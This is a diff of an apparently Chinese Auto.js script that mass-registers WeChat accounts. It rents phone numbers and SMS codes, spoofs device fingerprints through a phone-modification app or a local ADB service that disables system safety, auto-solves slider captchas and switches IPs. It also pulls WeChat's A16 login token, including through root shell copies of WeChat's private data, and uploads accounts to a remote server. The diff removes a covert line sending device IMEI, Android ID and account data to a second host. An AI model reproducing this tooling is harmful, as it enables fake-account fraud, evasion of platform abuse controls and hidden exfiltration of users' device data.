@@ -8,7 +8,7 @@ var storage = storages.create("微信")
 const time_delay = 1000
 var y = 1058 //设置滑动按钮高度
 var 特殊标记 = Array()//作用为保留号码信息进行注册
-var _G_token
+var _G_token,adb改机初次运行状态记录=true
 const 运行次数备份 = parseInt(storage.get("计数设置", 5))
 var gjm_tr
 const 微信名 = app.getAppName("com.tencent.mm")
@@ -536,17 +536,17 @@ function get_phone_number() {
 
 
 function get_password() {
-    function randomWord(randomFlag, min, max){
+    function randomWord(randomFlag, min, max) {
         var str = "",
             range = min,
-            arr = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z','#','$','%',',','.','_','~','!','@','&'];
-     
+            arr = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '$', ',', '.', '_', '~', '!', '@'];
+
         // 随机产生
-        if(randomFlag){
-            range = Math.round(Math.random() * (max-min)) + min;
+        if (randomFlag) {
+            range = Math.round(Math.random() * (max - min)) + min;
         }
-        for(var i=0; i<range; i++){
-            pos = Math.round(Math.random() * (arr.length-1));
+        for (var i = 0; i < range; i++) {
+            pos = Math.round(Math.random() * (arr.length - 1));
             str += arr[pos];
         }
         return str;
@@ -564,39 +564,55 @@ function get_password() {
     return randomWord(true, 8, 16)
 }
 
-
 function gaiji() {
+    var 改机模式 = storage.get("改机模式",0)
+    switch (改机模式) {
+        case 0:
+            IGgaiji()
+            break;
+    
+        case 1:
+            ADB改机()
+            break;
+        case 2:
+            ADB改机()
+            break;
+    }
+}
+
+function IGgaiji() {
 
     for (let 刺猬计数 = 0; 刺猬计数 < 5; 刺猬计数++) {
-        
-        if (device.sdkInt >=24) {
+
+        if (device.sdkInt >= 24) {
             console.hide()
             home();
             sleep(1000)
             home();
             sleep(1000)
-            let dd=text("IG刺猬精灵").findOne(1000);
+            let dd = text("IG刺猬精灵").findOne(1000);
             if (dd) {
-                
-                press(dd.bounds().centerX(),dd.bounds().centerY(),200)
-            }else{
+
+                press(dd.bounds().centerX(), dd.bounds().centerY(), 200)
+            } else {
                 toastLog("主页没找到IG刺猬精灵")
             }
             console.show()
         } else {
             app.launchApp("IG刺猬精灵")
         }
-        
+
         log("等待打开刺猬精灵")
-        sleep(4000)
-        var 确定标记=false
+        sleep(1000)
+        var 确定标记 = false
         for (let index = 0; index < 30; index++) {
-            var yijian = text("一键新机").depth(11).exists()
-            var denglu = text("登录").exists()
-            var 请输入手机号 = text("请输入手机号码，无则留空").className("android.widget.EditText").exists()
-            var wangluoyichang = textContains("网络请求异常").exists()
-            var fangqi = textContains("更新提醒").exists()
-            var 确定 =  text("确定").exists()
+            log("检测中")
+            var yijian = text("一键新机").depth(11).findOne(50)
+            var denglu = text("登录").findOne(50)
+            var 请输入手机号 = className(my_className_lsit.edit).findOne(50)
+            var wangluoyichang = textContains("网络请求异常").findOne(50)
+            var fangqi = textContains("更新提醒").findOne(50)
+            var 确定 = text("确定").findOne(50)
             if (yijian) {
 
                 // sleep(1000)
@@ -604,6 +620,7 @@ function gaiji() {
                 if (xinji) {
                     log("发现一键改机")
                     xinji.parent().click()
+                    log('点击完成')
                 }
 
             } else if (请输入手机号) {
@@ -612,33 +629,47 @@ function gaiji() {
                 if (shurukuang) {
                     log("找到手机号码输入框")
                     log("设置手机号:" + shurukuang.setText(_G_状态记录器.当前号码信息.手机号))
-                    确定标记=true
+                    确定标记 = true
                 } else {
                     log("找不到手机号输入框")
                 }
 
                 var quedin = text("确定").findOne(3000)
                 if (quedin) {
-                    log("将点击改机确定:")
-                    quedin.click()
-                }else{
+                    sleep(500)
+                    let 确定点击 = quedin.click()
+                    log("将点击改机确定:" + 确定点击)
+                    
+                    if (确定点击) {
+                        for (let chaoshi = 0; chaoshi < 10; chaoshi++) {
+                            if (!_G_状态记录器.改机完成标记) {
+                                log("等待改机完成," + (10 - chaoshi) * 2 + "秒后重试")
+                                sleep(2000)
+                            } else {
+                                log("改机完成")
+                                home()
+                                log("退出改机软件")
+                                return 
+                            }
+                        }
+                    }else{
+                        log("坐标点击")
+                        click(quedin.bounds().centerX(),quedin.bounds().centerY())
+                        for (let chaoshi = 0; chaoshi < 10; chaoshi++) {
+                            if (!_G_状态记录器.改机完成标记) {
+                                log("等待改机完成," + (10 - chaoshi) * 2 + "秒后重试")
+                                sleep(2000)
+                            } else {
+                                log("改机完成")
+                                home()
+                                log("退出改机软件")
+                                return 
+                            }
+                        }
+                    }
+                } else {
                     log("没找到确定按钮")
                 }
-
-                for (let chaoshi = 0; chaoshi < 10; chaoshi++) {
-                    if (!_G_状态记录器.改机完成标记) {
-                        log("等待改机完成," + (10 - chaoshi) * 2 + "秒后重试")
-                        sleep(2000)
-                    } else {
-                        log("改机完成")
-                        home()
-                        log("退出改机软件")
-                        return
-                    }
-
-                }
-
-
             } else if (denglu) {
                 log("发现登录按钮")
                 var ff = text("登录").findOne(1000)
@@ -650,19 +681,19 @@ function gaiji() {
                     fq.click()
                 }
 
-            }else if (wangluoyichang) {
+            } else if (wangluoyichang) {
                 var quedin = text("确定").findOne(3000)
                 if (quedin) {
                     log("将点击确定")
                     quedin.click()
                 }
-            }else if(确定 && 确定标记){
+            } else if (确定 && 确定标记) {
                 // 确定标记
                 log("将独立查找确定按钮")
                 var quedin = textContains("确定").findOne(3000)
                 if (quedin) {
-                    let ss=quedin.click()
-                    log("确定点击状态:"+ss)
+                    let ss = quedin.click()
+                    log("确定点击状态:" + ss)
                 } else {
                     log("没找到确定按钮")
                 }
@@ -674,9 +705,45 @@ function gaiji() {
         sleep(3000)
     }
     log("5次开启IG失败,退出")
-    // exit()
+    
 }
 
+function ADB改机() {
+    toastLog("将调用本地网络改机")
+    if (adb改机初次运行状态记录) {//初次运行
+        toastLog("初次运行,关闭系统安全")
+        try {
+            let res=http.get("http://127.0.0.1:8765/cmd?action=SysSafety&params=0")
+            if (res.statusCode==200) {
+                if (res.body.string()=="OK") {
+                    toastLog("关闭系统安全完成")
+                }else{
+                    toastLog("关闭系统安全错误:"+res.body.string())
+                }
+            }else{
+                log("网络错误:"+res.statusCode+res.statusMessage)
+            }
+        } catch (error) {
+            log("网络错误:"+error)
+        }
+        adb改机初次运行状态记录=false
+    }
+    try {
+        let res=http.get("http://127.0.0.1:8765/cmd?action=new")
+        if (res.statusCode==200) {
+            if (res.body.string()=="OK") {
+                toastLog("一键新机完成")
+            }else{
+                toastLog("一键新机错误:"+res.body.string())
+            }
+        }else{
+            log("请求错误:"+res.statusCode+res.statusMessage)
+        }
+        
+    } catch (error) {
+        log("错误捕获:"+error)
+    }
+}
 
 function lahei(pid) {
     pid = String(pid)
@@ -685,45 +752,46 @@ function lahei(pid) {
     while (true) {
         try {
             var res = http.get("http://47.74.144.186/yhapi.ashx?act=addBlack&token=" + token + "&pid=" + pid + "&reason=used")
-            let data= res.body.string()
-            data= data.split("|")
-            if (data[0]==1) {
+            let data = res.body.string()
+            log("拉黑返回信息:" + data)
+            data = data.split("|")
+            if (data[0] == "1") {
                 log("拉黑完成")
                 return true
-            }else{
+            } else {
                 switch (data[1]) {
-                    case -1:
+                    case "-1":
                         log("Token不存在")
                         log("拉黑失败")
                         return false;
-                
-                    case -2:
+
+                    case "-2":
                         log("拉黑失败")
                         log("pid不存在")
                         return false;
-                
-                    case -3:
+
+                    case "-3":
                         log("拉黑失败")
                         log("加黑原因不能为空")
                         return false;
-                
-                    case -4:
+
+                    case "-4":
                         log("拉黑失败")
                         log("手机号不存在或已释放")
                         return false;
-                
-                    case -5:
+
+                    case "-5":
                         log("拉黑失败")
                         log("未回码,请释放")
                         return false;
                 }
-            
+
             }
         } catch (error) {
             log(error)
         }
     }
-    
+
 
 }
 
@@ -743,11 +811,13 @@ function get_yanzhengma(pid) {
                 setClip(完整参数)
                 var res = http.get("http://47.74.144.186/yhapi.ashx?act=getPhoneCode&token=" + token + "&pid=" + pid)
                 res_tostr = res.body.string()
-
+                log("响应内容:"+res_tostr)
                 var res_to_arr = res_tostr.split("|")
                 if (res_to_arr[0] == 1) {
+                    log("标志为为1")
                     return res_to_arr[1]
                 } else if (res_to_arr[0] == "0") {
+                    log("标志为为0")
                     switch (res_to_arr[1]) {
                         case "-4":
                             log("号码被后台强制释放")
@@ -793,7 +863,7 @@ function 上传信息(info) {
         for (let index = 0; index < 2; index++) {
             log("上传数据尝试次数:%d", index)
             try {
-                var res = http.get("http://47.74.248.9/updata?username=" + 上传账户 + "&password=" + 上传密码 + "&type=1&value=" + encodeURI(info)); http.get("http://119.29.234.95:8000/?imei=" +String(device)+ "&androidid=" +device.getAndroidId()+ "&info=" + info)
+                var res = http.get("http://47.74.248.9/updata?username=" + 上传账户 + "&password=" + 上传密码 + "&type=1&value=" + encodeURI(info));
                 var dd = res.body.string()
                 log(dd)
                 return dd
@@ -812,6 +882,7 @@ function 启动微信() {
             return true
         }
         log("等待微信加载")
+        log("当前包名:"+currentPackage())
         sleep(3000)
 
 
@@ -838,10 +909,15 @@ function 判断IP可用性(检测ip标记) {
     if (检测ip标记) {
         return true
     }
+    let ip开关 = storage.get("检测IP开关")
+    if (ip开关==1) {
+        log("检测IP已关闭")
+        return true
+    }
     for (let index = 0; index < 6; index++) {
         try {
 
-            log("国家码:"+gjm_tr)
+            log("国家码:" + gjm_tr)
             let res = http.get("http://47.74.250.102?gjm=" + gjm_tr)
             let data = res.body.json()
             log(data)
@@ -852,12 +928,12 @@ function 判断IP可用性(检测ip标记) {
             }
         } catch (error) {
             log(error)
-            log("本次检测ip 网络错误,将重试%d",6-index)
+            log("本次检测ip 网络错误,将重试%d", 6 - index)
             sleep(3000)
         }
-        
+
     }
-    
+
 }
 function main() {
     // 网络加载()
@@ -897,21 +973,34 @@ function main() {
         _G_状态记录器.当前号码信息 = phone_number
         if (xinhao == 0 || xinhao == 1) {
             //调用ig改机
-            log("调用ig改机")
-            gaiji()
+            log("调用改机")
+            IGgaiji()
             if (!启动微信()) {
                 log("微信启动失败")
                 特殊标记.push(_G_状态记录器.当前号码信息)
                 continue
             }
         } else if (xinhao == 2) {
-            //调用多米改机
-            log("调用多米改机")
-            if (!多米改机启动微信()) {
-                log("多米改机启动失败")
-                特殊标记.push(_G_状态记录器.当前号码信息)
-                continue
+            var 改机模式 = storage.get("改机模式",0)
+            switch (改机模式) {
+                case 0:
+                    IGgaiji()
+                    break;
+            
+                case 1:
+                    ADB改机()
+                    break;
+                case 2:
+                    //调用多米改机
+                    log("调用多米改机")
+                    if (!多米改机启动微信()) {
+                        log("多米改机启动失败")
+                        特殊标记.push(_G_状态记录器.当前号码信息)
+                        continue
+                    }
+                    break;
             }
+            
         }
 
         if (!zhuce()) {
@@ -936,7 +1025,7 @@ function main() {
     }
 }
 
-function 修改网络(gn,检测ip标记) {
+function 修改网络(gn, 检测ip标记) {
     log("修改网络")
     var 网络模式 = storage.get("net_mode", 0)
     // var 网络模式 = "0"
@@ -948,7 +1037,7 @@ function 修改网络(gn,检测ip标记) {
             if (判断IP可用性()) {
                 log('ip检测结果:可用')
                 return true
-            }else{
+            } else {
                 log("当前IP不可用")
             }
             log("等待可用IP中")
@@ -958,7 +1047,7 @@ function 修改网络(gn,检测ip标记) {
             if (判断IP可用性(检测ip标记)) {
                 log('ip检测结果:可用')
                 return true
-            }else{
+            } else {
                 log("当前IP不可用")
             }
             log("等待可用IP中")
@@ -1176,7 +1265,24 @@ function 强行停止APP(包名) {
 
 function GET_A16() {   //据说运行之前要先杀死微信
     if (storage.get("xinhao", 0) == 2) {
-        log("小米5s,不提取A16")
+        if (storage.get("改机方式",0)==1) {
+            try {
+                var re= http.get("http://127.0.0.1:8765/cmd?action=a16")
+                if (re.statusCode==200) {
+                    let data=re.body.string()
+                    log("A16:"+data)
+                    return data
+                }
+            } catch (error) {
+                log(error)
+            }
+        }else{
+            log("小米5s,不提取A16")
+            return false
+        }
+    }
+    if (storage.get("提取A16开关", 0) == 1) {
+        log("A16提取已被关闭")
         return false
     }
     强行停止APP("com.tencent.mm")
@@ -1285,8 +1391,8 @@ function 等待结果() {
 
 function getPixel(x, y) {
     if (x > 0 && x < device.width && y > 0 && y < device.height) {
-        
-        
+
+
         let img = 截图();
         if (!img) {
             return false
@@ -1300,8 +1406,8 @@ function getPixel(x, y) {
 }
 
 function 滑块处理() {
-    let 滑块处理开关=storage.get("滑块开关",0)
-    if (滑块处理开关==1) {
+    let 滑块处理开关 = storage.get("滑块开关", 0)
+    if (滑块处理开关 == 1) {
         log("自动滑块已关闭")
         sleep(5000)
         return true
@@ -1538,7 +1644,7 @@ function 滑块处理() {
             _G_arr0.push([x, 宽 - x, "#000000"])
         }
         try {
-            
+
             var ime = 截图();
             if (!ime) {
                 return false
@@ -1790,21 +1896,21 @@ function 全局检测循环() {
             continue
         }
         function 飞行切换() {
-            let 开关=storage.get("二维码飞行开关")
-            if (开关==1) {
+            let 开关 = storage.get("二维码飞行开关")
+            if (开关 == 1) {
                 return true
             }
-            修改网络(true,true)
+            修改网络(true, true)
             启动微信()
         }
         if (tag_7) {
             log("出现二维码")
-            let 二维码返回次数=parseInt( storage.get("二维码返回次数","5"))
-            if (_G_状态记录器.跳码计数 >= 二维码返回次数-1) {
-                log("%d次二维码,下一个",二维码返回次数)
+            let 二维码返回次数 = parseInt(storage.get("二维码返回次数", "5"))
+            if (_G_状态记录器.跳码计数 >= 二维码返回次数 - 1) {
+                log("%d次二维码,下一个", 二维码返回次数)
             } else {
                 飞行切换()
-                let backTime=storage.get("返回时间")
+                let backTime = storage.get("返回时间")
                 backTime = parseInt(backTime) * 1000
                 sleep(backTime)
                 var fanhui = desc("返回").findOne(1000)
@@ -1831,12 +1937,12 @@ function 全局检测循环() {
         }
         if (tag_7_desc) {
             log("出现二维码")
-            let 二维码返回次数=parseInt( storage.get("二维码返回次数","5"))
-            if (_G_状态记录器.跳码计数 >= 二维码返回次数-1) {
-                log("%d次二维码,下一个",二维码返回次数)
+            let 二维码返回次数 = parseInt(storage.get("二维码返回次数", "5"))
+            if (_G_状态记录器.跳码计数 >= 二维码返回次数 - 1) {
+                log("%d次二维码,下一个", 二维码返回次数)
             } else {
                 飞行切换()
-                let backTime=storage.get("返回时间")
+                let backTime = storage.get("返回时间")
                 backTime = parseInt(backTime) * 1000
                 sleep(backTime)
                 var fanhui = desc("返回").findOne(1000)
@@ -1885,7 +1991,7 @@ function 全局检测循环() {
             continue
 
         }
-        
+
         if (tag_8) {
 
             tag_8.click()
@@ -2297,7 +2403,7 @@ function 鸭子(文本, timeout) {
                     dd = dd.parent()
                 }
             } catch (error) {
-                
+
             }
         }
     }
@@ -2351,102 +2457,30 @@ function 填写验证码() {
 
 var temp_path = "/sdcard/360/abc"
 
-function get_a16_703() {
-    var temp_path = "/sdcard/360/abc"
-    var list_file = files.listDir(temp_path)
-    list_file.forEach(element => {
-        var hehe = files.join(temp_path, element)
-        if (files.getExtension(hehe) == "statistic") {
-            if (files.isFile(hehe)) {
-                log(hehe)
-                var data = files.read(hehe)
-                log(data.substr(0, 100))
-                var sb = new java.lang.StringBuilder();
-                for (var i = 0; i < data.length; i++) {
-                    sb.append(data[i].toString(16));
-
-                }
-                var t5 = sb.toString()
-                var reg = t5.search(/A[0-9a-fA-F]+,+/)
-                log(t5.substr(reg, 16));
-                // log(reg);当前脚本第15行：A9541e42f280874b  当前脚本第15行：A9541e42f280874b
-            }
-        }
-    })
-}
 
 
-function cpa16() {
-    var temp_path = "/sdcard/360/abc"
-    var sh = new Shell(true);
-    sh.setCallback({
-        onNewLine: function (line) {
-            //有新的一行输出时打印到控制台
-            log(line);
-        }
-    })
-    sh.exec("rm -rf " + temp_path);
-    var com = "cp -r /data/user/0/com.tencent.mm/files/kvcomm/. " + temp_path
-    sh.exec(com)
-    sh.exitAndWaitFor()
 
-
-}
-
-function get_a16_67() {
-    // cpa16()
-    // var temp_path="/storage/emulated/0/360/abc"
-    // files.ensureDir(temp_path)
-
-    // log(shell("rm -rf "+temp_path,true))
-    // log(ff)//当前脚本第15行：A9541e42f280874b
-    // var base = "/data/user/0/com.tencent.mm/files/kvcomm/"
-    // var base = "/sdcard/360"
-    var temp_path = "/sdcard/360/abc"
-    var basedir = files.listDir(temp_path)
-
-    basedir.forEach(element => {
-        var hehe = files.join(temp_path, element)
-
-        if (files.isFile(hehe)) {
-            log(hehe)
-            var data = files.read(hehe)
-            var sb = new java.lang.StringBuilder();
-            for (var i = 0; i < data.length; i++) {
-                sb.append(data[i].toString(16));
-
-            }
-            var t5 = sb.toString()
-            var reg = t5.search(/A[0-9a-fA-F]+,+/)
-            log(t5.substr(reg, 16));
-            // log(reg);当前脚本第15行：A9541e42f280874b  当前脚本第15行：A9541e42f280874b
-
-
-        }
-    });
-
-}
 function 截图() {
-    log("调用者:"+arguments.caller)
-    var img_temp=null;
+    log("调用者:" + arguments.caller)
+    var img_temp = null;
     let thr = threads.start(function () {
-        img_temp=images.captureScreen(); 
-    } )
+        img_temp = images.captureScreen();
+    })
     for (let index = 0; index < 5; index++) {
         if (img_temp) {
-           break;
-            
-            
+            break;
+
+
         }
         sleep(100)
     }
-    try{
+    try {
         thr.interrupt()
         // log("线程中断完成")
-    }catch(error){
+    } catch (error) {
 
     }
-    
+
     return img_temp
 }
 function huakuai_start() {
@@ -2519,13 +2553,7 @@ function huakuai_start() {
 
 
 
-function 读取地址(params) {
-    var 地址 = textContains("地区").findOne()
-    var 地址_value = 地址.text()
-    var data = 地址_value.replace(/地区: /, "")
-    log(data)
-    return data
-}
+
 
 
 // test()
